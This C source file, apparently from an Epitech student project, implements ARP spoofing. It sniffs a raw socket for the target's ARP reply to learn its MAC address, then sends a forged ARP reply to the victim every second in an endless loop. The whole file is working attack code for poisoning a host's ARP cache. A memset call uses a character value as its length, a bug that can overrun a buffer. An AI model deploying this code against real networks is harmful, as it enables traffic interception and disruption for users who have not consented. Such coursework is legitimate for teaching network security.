/*
** EPITECH PROJECT, 2019
** Project name
** File description:
** Description
*/

#include "../include/my.h"

void spoof_victim(struct sockaddr_ll *origin, uint8_t *victim_mac_addr,
    info_t *info)
{
    arp_t *arp = create_arp(info, victim_mac_addr);
    ethernet_t *eth;

    arp->opcode = htons(2);
    eth = create_ethernet(info, victim_mac_addr, arp);
    printf("Found victim's MAC address: '%.2X:%.2X:%.2X:%.2X:%.2X:%.2X'\n"
    , victim_mac_addr[0], victim_mac_addr[1], victim_mac_addr[2],
    victim_mac_addr[3], victim_mac_addr[4], victim_mac_addr[5]);
    while (1) {
        if ((sendto(info->socket, eth, 42, 0,
            (const struct sockaddr *)origin, sizeof(*origin)) <= 0))
                exit(84);
        printf("Spoofed packet send to '%s'\n", info->target_ip);
        sleep(1);
    }
}

void victim_mac_address(info_t *info, struct sockaddr_ll *origin)
{
    arp_t *arp;
    ethernet_t *eth;
    char victim_mac_addr_str[16] = {0};
    char buf[65535];
    uint8_t *victim_mac_addr = malloc(sizeof(uint8_t) * 6);
    while (1) {
        if (recvfrom(info->socket, buf, 65535, 0, NULL, NULL) <= 0) {
            exit(84);
        }
        eth = (ethernet_t *)buf;
        if (ntohs(eth->type) != 0x0806)
            continue;
        arp = (arp_t *)(buf + 14);
        if (ntohs(arp->opcode) != 2 || (arp->sender_ip_addr &&
        !inet_ntop(AF_INET, arp->sender_ip_addr, victim_mac_addr_str, 16)) ||
        strcmp(victim_mac_addr_str, info->target_ip)) {
            memset(victim_mac_addr_str, 0, *info->target_ip);
            continue;
        }
        memcpy(victim_mac_addr, arp->sender_mac_addr, 6 * sizeof(uint8_t));
        break;
    }
    spoof_victim(origin, victim_mac_addr, info);
}